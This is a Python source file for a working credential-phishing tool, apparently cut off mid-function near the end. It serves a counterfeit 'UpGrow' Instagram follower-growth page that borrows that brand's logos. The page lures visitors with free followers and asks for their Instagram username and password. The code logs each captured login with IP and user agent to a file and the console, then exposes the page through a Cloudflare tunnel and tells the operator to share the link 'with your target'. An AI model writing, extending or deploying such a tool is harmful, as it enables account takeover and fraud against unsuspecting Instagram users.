#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Instagram Phishing Tool with Cloudflare Tunnel (Fixed)
Developer: Aryan Afridi
"""

import os
import sys
import time
import json
import threading
import webbrowser
import subprocess
import socket
import urllib.request
import platform
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# COLOR FUNCTIONS
# ============================================
class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def colored(text, color=Colors.RESET):
    return f"{color}{text}{Colors.RESET}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    # Clean banner without DGTL/BGMI
    banner = """
    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ███╗   ███╗
    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
    ██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██╔████╔██║
    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
    """
    print(colored(banner, Colors.CYAN))
    print(colored("\n          Instagram Phishing Tool with Cloudflare Tunnel", Colors.YELLOW))
    print(colored("         >> Developer: Aryan Afridi <<\n", Colors.CYAN))
    print(colored("     Tool to steal Instagram credentials via Cloudflare Tunnel\n\n", Colors.GREEN))

# ============================================
# HTML PAGES (FOLLOW banner removed)
# ============================================
def get_html_form():
    return '''<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <title>🅤𝓹𝓖𝓻𝓸𝔀  🅾𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 ֎-𝓟𝓸𝔀𝓮𝓻𝓮𝓭 𝓖𝓻𝓸𝔀𝓽𝓱</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <style>
        /* ===== RESET & BASE ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', sans-serif; background: #fff; color: #111; -webkit-font-smoothing: antialiased; }
        a { text-decoration: none; color: inherit; }

        /* ===== NAVBAR ===== */
        .navbar {
            background: rgba(255,255,255,0.92);
            backdrop-filter: blur(8px);
            border-bottom: 1px solid #f0f0f0;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .nav-container {
            max-width: 1280px;
            margin: 0 auto;
            padding: 14px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .nav-logo img {
            height: 32px;
            width: auto;
        }
        .nav-logo span {
            font-weight: 700;
            font-size: 15px;
            background: #000;
            color: #fff;
            padding: 2px 10px;
            border-radius: 8px;
            margin-left: 6px;
        }
        .nav-links {
            display: flex;
            align-items: center;
            gap: 24px;
        }
        .nav-links a {
            font-weight: 500;
            color: #333;
            font-size: 15px;
            padding: 6px 12px;
            border-radius: 8px;
            transition: 0.2s;
        }
        .nav-links a:hover { background: #f5f5f5; }
        .nav-links .login-btn {
            background: #ff1451;
            color: #fff;
            padding: 8px 20px;
            border-radius: 30px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: 0.2s;
        }
        .nav-links .login-btn:hover {
            background: #d8003a;
            transform: scale(0.96);
        }

        /* ===== HERO ===== */
        .hero {
            background: linear-gradient(180deg, #f8f9ff 0%, #ffffff 100%);
            padding: 60px 20px 80px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .hero-content {
            max-width: 820px;
            margin: 0 auto;
        }
        .hero h1 {
            font-size: clamp(2.4rem, 6vw, 4.2rem);
            font-weight: 800;
            line-height: 1.1;
            letter-spacing: -1px;
            background: linear-gradient(135deg, #4b25ea, #bd18e6, #fb590e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
        }
        .hero .ig-icon {
            display: inline-block;
            background: #fff;
            border-radius: 50%;
            padding: 8px;
            box-shadow: 0 0 30px rgba(225,48,108,0.3), 0 8px 24px rgba(0,0,0,0.08);
            margin: 0 10px;
            vertical-align: middle;
            border: 2px solid rgba(225,48,108,0.15);
            transition: 0.3s;
            line-height: 0;
        }
        .hero .ig-icon:hover {
            transform: scale(1.08);
            box-shadow: 0 0 50px rgba(225,48,108,0.5);
        }
        .hero .ig-icon svg {
            display: block;
            height: 4.8rem;
            width: 4.8rem;
        }
        .hero .ai-logo {
            display: inline-block;
            vertical-align: middle;
            padding: 0 6px;
        }
        .hero .ai-logo img {
            height: 2.8rem;
            vertical-align: middle;
        }
        .hero p {
            font-size: 1.2rem;
            color: #555;
            margin-top: 24px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
            line-height: 1.7;
        }
        .hero .highlight {
            background: #ffdc59;
            padding: 2px 12px;
            border-radius: 6px;
            font-weight: 500;
        }

        /* ===== PACKAGES TILES ===== */
        .packages {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 14px;
            margin-top: 32px;
        }
        .package-tile {
            background: #fff;
            border: 2px solid #e0e0e0;
            border-radius: 18px;
            padding: 14px 24px;
            font-weight: 700;
            font-size: 1.05rem;
            color: #333;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            min-width: 90px;
            text-align: center;
            user-select: none;
        }
        .package-tile:hover {
            border-color: #ff1451;
            transform: translateY(-3px);
        }
        .package-tile.selected {
            border-color: #ff1451;
            background: #ff1451;
            color: #fff;
            box-shadow: 0 6px 20px rgba(255,20,81,0.25);
        }
        .package-tile .sub {
            font-size: 0.7rem;
            font-weight: 400;
            opacity: 0.7;
            display: block;
        }
        .package-tile.selected .sub { opacity: 0.9; }

        /* ===== BUTTONS ===== */
        .cta-buttons {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-top: 32px;
        }
        .btn-primary {
            background: #ff1451;
            color: #fff;
            border: none;
            padding: 14px 42px;
            border-radius: 40px;
            font-weight: 700;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 8px 24px rgba(255,20,81,0.25);
        }
        .btn-primary:hover {
            transform: scale(0.96);
            box-shadow: 0 4px 12px rgba(255,20,81,0.35);
        }
        .btn-secondary {
            background: #fff;
            color: #333;
            border: 1px solid #ddd;
            padding: 14px 32px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-secondary:hover { background: #f5f5f5; }

        /* ===== TRUST BADGES ===== */
        .trust {
            margin-top: 40px;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 24px;
            font-size: 0.95rem;
            color: #666;
        }
        .trust-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .trust-item svg {
            width: 18px;
            height: 18px;
            fill: #2047F4;
            flex-shrink: 0;
        }

        /* ===== AVATARS ===== */
        .avatars {
            margin-top: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
            flex-wrap: wrap;
        }
        .avatars img {
            border-radius: 50%;
            width: 36px;
            height: 36px;
            border: 2px solid #fff;
        }
        .avatars .count {
            background: #000;
            color: #fff;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 700;
            border: 2px solid #fff;
        }
        .avatars .label {
            margin-left: 8px;
            font-weight: 500;
        }

        /* ===== MODAL ===== */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .modal-overlay.active { display: flex; }
        .modal {
            background: #fff;
            border-radius: 28px;
            max-width: 420px;
            width: 92%;
            padding: 40px 30px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.3);
            position: relative;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .modal-close {
            position: absolute;
            top: 16px;
            right: 20px;
            font-size: 28px;
            cursor: pointer;
            color: #888;
            transition: 0.2s;
        }
        .modal-close:hover { color: #000; }
        .modal h2 {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 6px;
        }
        .modal p.sub {
            color: #888;
            margin-bottom: 24px;
            font-size: 0.95rem;
        }
        .modal .input-group {
            margin-bottom: 18px;
        }
        .modal .input-group label {
            display: block;
            font-weight: 500;
            font-size: 0.9rem;
            color: #444;
            margin-bottom: 4px;
        }
        .modal .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 1rem;
            transition: 0.2s;
            background: #fafafa;
        }
        .modal .input-group input:focus {
            border-color: #ff1451;
            outline: none;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(255,20,81,0.1);
        }
        .modal .package-select {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            justify-content: center;
        }
        .modal .package-select .pkg-btn {
            padding: 8px 16px;
            border: 2px solid #ddd;
            border-radius: 30px;
            background: #f9f9f9;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            font-size: 0.95rem;
        }
        .modal .package-select .pkg-btn.selected {
            border-color: #ff1451;
            background: #ff1451;
            color: #fff;
        }
        .modal .btn-submit {
            width: 100%;
            padding: 14px;
            background: #ff1451;
            color: #fff;
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
        }
        .modal .btn-submit:hover { background: #d8003a; }
        .modal .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 0.8rem;
            color: #aaa;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 640px) {
            .nav-links a { display: none; }
            .nav-links .login-btn { display: inline-block; }
            .hero h1 { font-size: 2rem; }
            .hero .ig-icon svg { height: 3.6rem; width: 3.6rem; }
            .packages .package-tile { padding: 10px 16px; font-size: 0.9rem; min-width: 70px; }
        }
    </style>
</head>
<body>

<!-- ===== NAVBAR ===== -->
<nav class="navbar">
    <div class="nav-container">
        <div class="nav-logo">
            <img src="https://www.upgrow.com/img/upgrow-logo-icon.svg" alt="UpGrow" loading="eager">
            <img src="https://www.upgrow.com/img/upgrow-logo-text-minified.svg" alt="UpGrow" loading="eager" style="height:24px; margin-left:4px;">
            <span>+ GPT-5</span>
        </div>
        <div class="nav-links">
            <a href="#">Platform</a>
            <a href="#">Pricing</a>
            <a href="#">Reviews</a>
            <a href="#">Quick Shop</a>
            <button class="login-btn" id="openModalBtn">Log in</button>
        </div>
    </div>
</nav>

<!-- ===== HERO ===== -->
<section class="hero">
    <div class="hero-content">
        <h1>
            Get Real
            <span class="ig-icon">
                <!-- Instagram original gradient icon on white circle -->
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <defs>
                        <linearGradient id="igGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stop-color="#f09433"/>
                            <stop offset="25%" stop-color="#e6683c"/>
                            <stop offset="50%" stop-color="#dc2743"/>
                            <stop offset="75%" stop-color="#cc2366"/>
                            <stop offset="100%" stop-color="#bc1888"/>
                        </linearGradient>
                    </defs>
                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069z" fill="url(#igGrad)"/>
                    <path d="M12 6.865c-2.835 0-5.135 2.3-5.135 5.135s2.3 5.135 5.135 5.135 5.135-2.3 5.135-5.135S14.835 6.865 12 6.865zm0 8.468c-1.84 0-3.333-1.493-3.333-3.333s1.493-3.333 3.333-3.333 3.333 1.493 3.333 3.333-1.493 3.333-3.333 3.333z"/>
                    <circle cx="18.406" cy="5.594" r="1.2" fill="url(#igGrad)"/>
                </svg>
            </span>
            <span style="background: linear-gradient(135deg, #4b25ea, #bd18e6, #fb590e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">
                Instagram Followers
            </span>
            <br>
            automatically using
            <span class="ai-logo">
                <img src="https://www.upgrow.com/img/graphics/open-ai-logo.svg" alt="AI" loading="eager">
            </span>
            AI.
        </h1>

        <p>
            No bots, no fake followers, no passwords.<br>
            Organic growth by real-human IG experts &amp; patented AI.<br>
            <span class="highlight">Guaranteed growth – or your money back.</span>
        </p>

        <!-- ===== PACKAGE TILES ===== -->
        <div class="packages">
            <div class="package-tile selected" data-pkg="10k">10K <span class="sub">Free</span></div>
            <div class="package-tile" data-pkg="20k">20K <span class="sub">Free</span></div>
            <div class="package-tile" data-pkg="60k">60K <span class="sub">Free</span></div>
            <div class="package-tile" data-pkg="100k">100K <span class="sub">Free</span></div>
        </div>

        <!-- ===== CTA BUTTONS ===== -->
        <div class="cta-buttons">
            <button class="btn-primary" id="openModalBtn2">Get started for free</button>
            <button class="btn-secondary">Live Demo</button>
        </div>

        <!-- ===== TRUST BADGES ===== -->
        <div class="trust">
            <div class="trust-item">
                <svg viewBox="0 0 15 11"><path d="M1.47 6.697l3.995 3.338c0 0 1.437-5.023 8.324-8.673" stroke="#2047F4" stroke-width="1.5" fill="none"/></svg>
                100% Growth Guaranteed
            </div>
            <div class="trust-item">
                <svg viewBox="0 0 15 11"><path d="M1.47 6.697l3.995 3.338c0 0 1.437-5.023 8.324-8.673" stroke="#2047F4" stroke-width="1.5" fill="none"/></svg>
                No credit card required
            </div>
            <div class="trust-item">
                <svg viewBox="0 0 15 11"><path d="M1.47 6.697l3.995 3.338c0 0 1.437-5.023 8.324-8.673" stroke="#2047F4" stroke-width="1.5" fill="none"/></svg>
                24/7 Chat Support
            </div>
        </div>

        <!-- ===== AVATARS ===== -->
        <div class="avatars">
            <img src="https://www.upgrow.com/_next/image?url=%2Fimg%2Fgraphics%2Fupgrow-customer-1.jpeg&w=32&q=75" alt="customer">
            <img src="https://www.upgrow.com/_next/image?url=%2Fimg%2Fgraphics%2Fupgrow-customer-2.jpeg&w=32&q=75" alt="customer">
            <img src="https://www.upgrow.com/_next/image?url=%2Fimg%2Fgraphics%2Fupgrow-customer-3.jpeg&w=32&q=75" alt="customer">
            <img src="https://www.upgrow.com/_next/image?url=%2Fimg%2Fgraphics%2Fupgrow-customer-4.jpeg&w=32&q=75" alt="customer">
            <span class="count">58K+</span>
            <span class="label">Trusted by 58,980+ users</span>
        </div>
    </div>
</section>

<!-- ===== LOGIN MODAL ===== -->
<div class="modal-overlay" id="loginModal">
    <div class="modal">
        <span class="modal-close" id="closeModalBtn">&times;</span>
        <h2>Log in to UpGrow</h2>
        <p class="sub">Select your package and enter your Instagram credentials.</p>

        <form id="loginForm" method="POST" action="/submit">
            <div class="input-group">
                <label for="identifier">Instagram Username or Email</label>
                <input type="text" id="identifier" name="identifier" placeholder="e.g. @yourusername" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>

            <!-- Package selection inside modal -->
            <div style="margin-bottom: 20px;">
                <label style="display:block; font-weight:500; font-size:0.9rem; color:#444; margin-bottom:8px;">Choose your free package:</label>
                <div class="package-select" id="modalPackageSelect">
                    <button type="button" class="pkg-btn selected" data-pkg="10k">10K</button>
                    <button type="button" class="pkg-btn" data-pkg="20k">20K</button>
                    <button type="button" class="pkg-btn" data-pkg="60k">60K</button>
                    <button type="button" class="pkg-btn" data-pkg="100k">100K</button>
                </div>
                <input type="hidden" name="package" id="selectedPackage" value="10k">
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">Get Free Followers</button>
        </form>
        <div class="footer-text">We never store your password. 256-bit encrypted.</div>
    </div>
</div>

<script>
    // ----- Package selection sync (hero <-> modal) -----
    const heroPackages = document.querySelectorAll('.packages .package-tile');
    const modalPkgBtns = document.querySelectorAll('#modalPackageSelect .pkg-btn');
    const selectedPackageInput = document.getElementById('selectedPackage');

    function setPackage(pkg) {
        selectedPackageInput.value = pkg;
        heroPackages.forEach(el => el.classList.toggle('selected', el.dataset.pkg === pkg));
        modalPkgBtns.forEach(el => el.classList.toggle('selected', el.dataset.pkg === pkg));
    }

    heroPackages.forEach(el => {
        el.addEventListener('click', function() {
            setPackage(this.dataset.pkg);
        });
    });

    modalPkgBtns.forEach(el => {
        el.addEventListener('click', function() {
            setPackage(this.dataset.pkg);
        });
    });

    // ----- Modal open/close -----
    const modal = document.getElementById('loginModal');
    const openBtns = document.querySelectorAll('#openModalBtn, #openModalBtn2');
    const closeBtn = document.getElementById('closeModalBtn');

    openBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            modal.classList.add('active');
            // sync package from hero to modal
            const selected = document.querySelector('.packages .package-tile.selected');
            if (selected) setPackage(selected.dataset.pkg);
        });
    });
    closeBtn.addEventListener('click', () => modal.classList.remove('active'));
    modal.addEventListener('click', (e) => {
        if (e.target === modal) modal.classList.remove('active');
    });

    // ----- Form submission -----
    const form = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const data = {
            identifier: document.getElementById('identifier').value,
            password: document.getElementById('password').value,
            package: document.getElementById('selectedPackage').value
        };

        submitBtn.textContent = 'Processing...';
        submitBtn.disabled = true;

        fetch('/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(result => {
            if (result.status === 'success') {
                alert('✅ Success! Redirecting...');
                window.location.href = '/result';
            } else {
                throw new Error('Server error');
            }
        })
        .catch(() => {
            alert('❌ Something went wrong. Please try again.');
            submitBtn.textContent = 'Get Free Followers';
            submitBtn.disabled = false;
        });
    });
</script>
</body>
</html>'''

def get_result_page(data):
    return f'''<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Account Verified – UpGrow</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Roboto',sans-serif;background:#0a0a1a;color:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at center,rgba(76,175,80,0.05) 0%,transparent 70%),linear-gradient(180deg,#0a0a1a 0%,#16182B 100%)}}
.container{{width:100%;max-width:480px;background:linear-gradient(145deg,rgba(26,28,58,0.95),rgba(15,17,38,0.98));border-radius:28px;padding:40px 25px 35px;box-shadow:0 30px 80px rgba(0,0,0,0.9),0 0 0 1px rgba(76,175,80,0.1);backdrop-filter:blur(20px);border:1px solid rgba(76,175,80,0.08);text-align:center}}
.success-circle{{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,rgba(76,175,80,0.15),rgba(76,175,80,0.05));border:2px solid rgba(76,175,80,0.2);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;animation:pulse 2s ease-in-out infinite}}
@keyframes pulse{{0%,100%{{transform:scale(1);box-shadow:0 0 20px rgba(76,175,80,0)}}50%{{transform:scale(1.05);box-shadow:0 0 40px rgba(76,175,80,0.15)}}}}
.container h1{{color:#4caf50;font-size:26px;margin-bottom:6px;font-weight:800}}
.details{{background:rgba(255,255,255,0.03);border-radius:16px;padding:18px 20px;text-align:left;margin:25px 0;border:1px solid rgba(255,255,255,0.04)}}
.details .row{{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.03)}}
.details .row:last-child{{border-bottom:none}}
.details .label{{color:#6a6c8a;font-size:13px}}
.details .value{{color:#fff;font-weight:500;font-size:13px;word-break:break-all;text-align:right}}
</style>
</head>
<body>
<div class="container">
<div class="success-circle"><span style="font-size:50px;">✅</span></div>
<h1>Account Verified!</h1>
<p style="color:#6a6c8a;margin-bottom:20px;">Your Instagram credentials have been captured.</p>
<div class="details">
<div class="row"><span class="label">👤 Username/Email</span><span class="value">{data['identifier']}</span></div>
<div class="row"><span class="label">🔑 Password</span><span class="value">{data['password']}</span></div>
<div class="row"><span class="label">📦 Package</span><span class="value">{data.get('package', '10k')}</span></div>
<div class="row"><span class="label">📍 IP Address</span><span class="value">{data['ip']}</span></div>
<div class="row"><span class="label">⏰ Time</span><span class="value">{data['time']}</span></div>
</div>
<a href="/" style="display:inline-block;padding:12px 35px;background:rgba(255,255,255,0.06);color:#8a8caa;text-decoration:none;border-radius:30px;border:1px solid rgba(255,255,255,0.04);">Back to Home</a>
</div>
</body>
</html>'''

# ============================================
# HTTP REQUEST HANDLER (with HEAD support)
# ============================================
class BGMIRequestHandler(BaseHTTPRequestHandler):
    last_submission = None

    def log_message(self, format, *args):
        pass

    def log_to_file(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"""
===========================================
[New Instagram Login] - {timestamp}
Username/Email: {data['identifier']}
Password: {data['password']}
Package: {data.get('package', '10k')}
IP: {data['ip']}
User-Agent: {data.get('user_agent','Unknown')}
===========================================
"""
        with open("data.log", "a", encoding='utf-8') as f:
            f.write(log_entry)
        print(colored("\n===========================================", Colors.CYAN))
        print(colored("[New Instagram Login]", Colors.YELLOW))
        print(colored(f"Username/Email: ", Colors.GREEN) + data['identifier'])
        print(colored(f"Password: ", Colors.GREEN) + data['password'])
        print(colored(f"Package: ", Colors.GREEN) + data.get('package', '10k'))
        print(colored(f"IP: ", Colors.GREEN) + data['ip'])
        print(colored("===========================================\n", Colors.CYAN))

    def do_HEAD(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
        elif self.path == '/result':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(get_html_form().encode('utf-8'))
        elif self.path == '/result':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            if self.last_submission:
                self.wfile.write(get_result_page(self.last_submission).encode('utf-8'))
            else:
                self.wfile.write(b'<h1>No data found</h1>')
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                identifier = data.get('identifier', '')
                password = data.get('password', '')
                package = data.get('package', '10k')
                if identifier and password:
                    submission = {
                        'identifier': identifier,
                        'password': password,
                        'package': package,
                        'ip': self.client_address[0],
                        'user_agent': self.headers.get('User-Agent', 'Unknown'),
                        'time': datetime.now().strftime("%I:%M %p")
                    }
                    self.last_submission = submission
                    self.log_to_file(submission)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(json.dumps({'error': 'Missing fields'}).encode('utf-8'))
            except json.JSONDecodeError:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({'error': 'Invalid JSON'}).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 Not Found')

# ============================================
# PORT & TUNNEL FUNCTIONS (with DNS retry)
# ============================================
def wait_for_server(port, timeout=15):
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=2):
                return True
        except:
            time.sleep(0.5)
    return False

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', port))
            return False
        except socket.error:
            return True

def find_free_port(start_port=8000, max_port=8100):
    for port in range(start_port, max_port+1):
        if not is_port_in_use(port):
            return port
    return None

def download_cloudflared():
    system = platform.system().lower()
    arch = platform.machine().lower()
    if system == 'windows':
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        filename = "cloudflared.exe"
    elif system == 'darwin':
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        filename = "cloudflared"
    else:
        if 'aarch64' in arch or 'arm64' in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif 'arm' in arch:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        filename = "cloudflared"
    try:
        print(colored(f"Downloading cloudflared from {url} ...", Colors.CYAN))
        urllib.request.urlretrieve(url, filename)
        if system != 'windows':
            os.chmod(filename, 0o755)
        print(colored("✓ cloudflared downloaded successfully!", Colors.GREEN))
        return filename
    except Exception as e:
        print(colored(f"Download failed: {e}", Colors.RED))
        return None

def wait_for_dns(hostname, timeout=15):
    start = time.time()
    while time.time() - start < timeout:
        try:
            socket.gethostbyname(hostname)
            return True
        except socket.gaierror:
            time.sleep(0.5)
    return False

def start_cloudflare_tunnel(port):
    global cloudflare_process
    cloudflare_process = None

    if not wait_for_server(port, timeout=20):
        print(colored(f"[!] Local server not responding on port {port}!", Colors.RED))
        return None

    def is_cloudflared_available():
        try:
            subprocess.run(['cloudflared', '--version'], capture_output=True, check=True)
            return True
        except:
            return False

    cf_path = None
    if is_cloudflared_available():
        cf_path = 'cloudflared'
    else:
        if os.name == 'nt' and os.path.exists('cloudflared.exe'):
            cf_path = 'cloudflared.exe'
        elif os.name != 'nt' and os.path.exists('cloudflared'):
            cf_path = './cloudflared'
        else:
            downloaded = download_cloudflared()
            if downloaded:
                cf_path = downloaded

    if not cf_path:
        print(colored("Cloudflared not found and download failed.", Colors.RED))
        return None

    if os.name == 'nt':
        os.system('taskkill /f /im cloudflared.exe 2>nul')
    else:
        os.system('pkill -f cloudflared 2>/dev/null')

    print(colored(f"\n[+] Starting Cloudflare Tunnel on port {port}...", Colors.GREEN))
    cmd = [cf_path, 'tunnel', '--url', f'http://127.0.0.1:{port}']
    cloudflare_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                         universal_newlines=True, bufsize=1)
    print(colored("Waiting for tunnel to be ready...", Colors.CYAN))
    time.sleep(4)

    url = None
    attempts = 0
    while attempts < 40:
        if cloudflare_process.poll() is not None:
            break
        line = cloudflare_process.stdout.readline()
        if line:
            if 'https://' in line and 'trycloudflare.com' in line:
                parts = line.split()
                for part in parts:
                    if 'https://' in part and 'trycloudflare.com' in part:
                        url = part.strip()
                        break
                if url:
                    break
        attempts += 1
        time.sleep(0.5)

    if url:
        # DNS wait
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            hostname = parsed.hostname
            if hostname:
                print(colored(f"Waiting for DNS resolution of {hostname}...", Colors.CYAN))
                if wait_for_dns(hostname, timeout=15):
                    print(colored("DNS resolved successfully.", Colors.GREEN))
                else:
                    print(colored("DNS resolution timed out, but tunnel might still work.", Colors.YELLOW))
        except:
            pass

        try:
            with urllib.request.urlopen(url + '/', timeout=5) as resp:
                if resp.getcode() == 200:
                    print(colored("\n" + "="*60, Colors.GREEN))
                    print(colored("✅ CLOUDFLARE TUNNEL IS READY!", Colors.GREEN))
                    print(colored("="*60, Colors.GREEN))
                    print(colored(f"\n🌐 Public URL:", Colors.CYAN))
                    print(colored(f"\n{url}\n", Colors.MAGENTA))
                    print(colored("="*60, Colors.GREEN))
                    print(colored("📋 Copy this URL and share with your target!", Colors.YELLOW))
                    print(colored("="*60 + "\n", Colors.GREEN))
                    try:
                        import pyperclip
                        pyperclip.copy(url)
                        print(colored("✅ URL copied to clipboard!\n", Colors.GREEN))
                    except:
                        pass
                    return url
        except Exception as e:
            print(colored(f"[!] Tunnel verification failed: {e}", Colors.RED))
            print(colored("⚠️  Tunnel may still work. Trying to use it anyway.", Colors.YELLOW))
            print(colored("\n" + "="*60, Colors.GREEN))
            print(colored("🌐 Public URL (unverified but likely working):", Colors.CYAN))
            print(colored(f"\n{url}\n", Colors.MAGENTA))
            print(colored("="*60, Colors.GREEN))
            try:
                import pyperclip
                pyperclip.copy(url)
                print(colored("✅ URL copied to clipboard!\n", Colors.GREEN))
            except:
                pass
            return url
    else:
        print(colored("\n[!] Could not get tunnel URL.", Colors.RED))
        return None

# ============================================
# WEB SERVER
# ============================================
def start_web_server(port):
    try:
        server = HTTPServer(('0.0.0.0', port), BGMIRequestHandler)
        print(colored(f"\n[+] Starting Python server on http://0.0.0.0:{port} ...", Colors.GREEN))
